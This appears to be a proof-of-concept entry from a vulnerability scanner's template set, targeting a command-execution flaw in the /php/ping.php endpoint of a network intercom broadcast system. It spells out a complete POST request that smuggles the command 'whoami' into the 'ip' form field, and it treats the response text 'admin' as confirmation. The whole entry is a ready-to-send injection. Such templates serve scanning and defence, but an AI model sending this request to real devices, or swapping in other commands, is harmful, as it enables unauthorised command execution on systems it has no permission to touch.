{
        'name': '网络对讲广播系统 /ping.php 命令执行漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/php/ping.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Connection': 'close'
            },
            'data': 'jsondata%5Btype%5D=99&jsondata%5Bip%5D=whoami',
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'admin'
        }}]
    }